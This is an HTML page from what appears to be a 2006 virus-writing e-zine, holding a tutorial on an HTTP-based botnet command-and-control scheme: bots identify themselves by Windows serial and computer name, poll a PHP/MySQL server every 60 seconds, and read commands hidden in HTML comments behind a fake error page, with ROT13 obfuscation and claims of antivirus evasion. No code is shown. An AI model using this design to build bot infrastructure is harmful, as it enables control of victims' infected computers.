@@ -1,0 +1,184 @@
+<html><head><title>EOF ISSUE #0x01</title>
+<style fprolloverstyle>A:hover {color: #D1F2C4; text-decoration: none}</style></head>
+<body text="#E0E0E0" bgcolor="#131313" link="#BFBFBF" vlink="#BFBFBF" alink="#BFBFBF" style="font-size: 10pt">
+
+<pre><hr>|| Author: RadiatioN/EOF || <a style="text-decoration: none" href="../mainmenu/articles.htm"><span style="text-decoration: none">Back to articles</span></a> ||<hr></pre>
+<pre>
+Http Bots - the new state of the art
+&macr;&macr;&macr;&macr;&macr;&macr;&macr;&macr;&macr;&macr;&macr;&macr;&macr;&macr;&macr;&macr;&macr;&macr;&macr;&macr;&macr;&macr;&macr;&macr;&macr;&macr;&macr;&macr;&macr;&macr;&macr;&macr;&macr;&macr;&macr;&macr;
+While i read alot of zombie computers and IRC based bots, i had the idea of creating a new style of bots 
+based on http. You may now think, http!? How should this work? Let me explain:
+
+If you search something on google you type in your data or search words by a formular in html.
+Then normaly you press 'Google Search' to find some stuff related to your search words.
+In our example, the formular on the google site sends its data with the GET method to itself for parsing it.
+As you can see in your browser you can read all of the data which was sent to the server like here:
+
+http://www.google.com/search?hl=en&amp;q=eof-project&amp;btnG=Google+Search
+
+if you split the url you can find some variables and values for it:
+hl = en
+q = eof-project
+btnG = Google+Search
+
+As we now know you can parse this query-strings by your own on a webserver, running LAMP/WAMP for example. 
+(as i used for development) So my idea was to build some url which is able to transfer data to a server and get some
+answers back from it. So a PHP script acts as a management console to control all bots connecting to the server.
+Got it? No problem...lets resume :D
+
+So i thought about what makes a PC unique between others to identify it like on a GUID? I tried it with the serial of
+windows and the computername. We need this two parameters that the PHP script is able identify one client
+and get the commands for the bot from a database. So this method is also able to store commands for bots which 
+are currently offline.
+
+For my tests i build a request string like:
+http://www.example.com/index.php?q=&lt;WINDOWS SERIAL&gt;&amp;hl=&lt;computername&gt;&amp;meta=&lt;status&gt;&amp;res=&lt;answers to server&gt;
+
+q    = Serial of windows to identify the bot
+hl   = name of computer which is infected also to identify the bot
+meta = gives some status info to the php script, for example &quot;login&quot; or &quot;data&quot;
+res  = your bot should be also able to send some answers to the server in here you can set it ;)
+
+Up to now i only described how you send data to a server, but what about getting commands from the server?
+easy: Just reply the commands with the php script as it would be a normal website :)
+To hide this information for a normal user which opens the url if he finds it in some logfiles it will be shown
+a site which looks like a server error. The real commands which should be interpreted by the bot are written between
+two HTML comment-tags.
+
+Http is a protocol which (normaly) disconnects a client when the site has been completely transfered, so we need
+a method to get data from the server regularly but also this is very easy: just request data every 60 seconds in a loop ;)
+
+Workflow of data transfer
+&macr;&macr;&macr;&macr;&macr;&macr;&macr;&macr;&macr;&macr;&macr;&macr;&macr;&macr;&macr;&macr;&macr;&macr;&macr;&macr;&macr;&macr;&macr;&macr;&macr;
+I know my english is sad and i cannot describe stuff as easy as i could do it in my mother tongue ;)
+so i did a little ASCII graphic to show how it works, maybe you then understand how it works (its easy
+believe me, if not look in the attached sources)
+
+ +--------------------------------------------------------+
+ |                   Client with bot                      |
+ +--------------------------------------------------------+
+
+    ||
+    ||
+    || 1. Sends HTTP Request to server
+    || http://www.example.com/index.php?q=ASDFGHJK&amp;hl=COMPUTER&amp;meta=LOGIN
+    ||
+    ||
+    \/
+
+ +--------------------------------------------------------+
+ |                 Server (example.com)                   |
+ |                                                        |
+ |    2. PHP Script connects to database                  |
+ |       and adds bot to it, cause it doesnt exists.      |
+ |       On login the server will not answer anything     |
+ |                                                        |
+ +--------------------------------------------------------+
+
+    ||
+    ||
+    || 3. Answer from server with some empty site
+    || 
+    ||
+    ||
+    \/
+
+ +--------------------------------------------------------+
+ |                   Client with bot                      |
+ |                                                        |
+ |     4. Client reads reply from server and does nothing |
+ |       Client goes to sleep for about 60 seconds        |
+ |                                                        |
+ +--------------------------------------------------------+
+
+    ||
+    ||
+    || 5. Sends HTTP Request to server
+    || http://www.example.com/index.php?q=ASDFGHJK&amp;hl=COMPUTER&amp;meta=DATA
+    ||
+    ||
+    \/
+
+ +--------------------------------------------------------+
+ |                 Server (example.com)                   |
+ |                                                        |
+ |    6. PHP Script connects to database                  |
+ |       and looks for commands in the database           |
+ |       which belongs to the bot                         |
+ |                                                        |
+ +--------------------------------------------------------+
+
+    ||
+    ||
+    || 7. Answer from server with command from bot-master
+    ||    For example:
+    ||    .uptime
+    ||
+    \/
+
+ +--------------------------------------------------------+
+ |                   Client with bot                      |
+ |                                                        |
+ |    8. Client reads reply and processes the action      |
+ |       requested.                                       |
+ |       Client now adds a reply to the answer queue:     |
+ |       &quot;I'm up for 2 days 2 hours and 5 minutes&quot;        |
+ |       Client goes to sleep for about 60 seconds        |
+ |                                                        |
+ +--------------------------------------------------------+
+
+    ||
+    ||
+    || 9. Sends HTTP Request to server
+    || http://www.example.com/index.php?q=ASDFGHJK&amp;hl=COMPUTER&amp;meta=DATA&amp;res=I'm%20up%20for%202%20days%202%20hours%20and%205%20minutes
+    ||
+    ||
+    \/
+
+ +--------------------------------------------------------+
+ |                 Server (example.com)                   |
+ |                                                        |
+ |   10. PHP Script connects to database                  |
+ |       and looks for commands to this bot in            |
+ |       the database.                                    |
+ |       PHP Script adds result from bot to database      |
+ |                                                        |
+ +--------------------------------------------------------+
+
+    ||
+    ||
+    ||
+    || This goes on and on until client or server goes off the net :)
+    ||
+    ||
+    \/
+
+   ....
+
+Now you can manage your bot via a http management console based on PHP &amp; MySql :)
+I hope you know understood how it works, if not look in the code i've written and attached it to the zine.
+
+In my implementation i added some simple ROT13 encoding to get more security for lame admins ;)
+The advantage of this technique is that it cannot be really detected by AV apps, cause its a completely new
+method for bots. One disadvantage is the sleep time of 60 seconds but if you have alot of bots and do a request
+with less then 60 seconds your server may goes down (Think of DDoS) *gg*
+
+Believe me: Look in the simple and short PHP/C++ Codes and you will understand it, also the Codes are well commented.
+
+Have much fun with this new episode of bots :D
+
+Last words
+&macr;&macr;&macr;&macr;&macr;&macr;&macr;&macr;&macr;&macr;
+Some nice greetings go to the complete EOF group and especially to Skyout my good friend *keep on rocking*
+
+As always no copyright - free for any use
+
+Tutorial written by RadiatioN in November-December 2006 at EOF group
+http://www.eof-project.net
+
+My Site:
+http://radiation.eof-project.net
+
+Contact:
+radiation[at]eof-project[dot]net
+</pre></body></html>
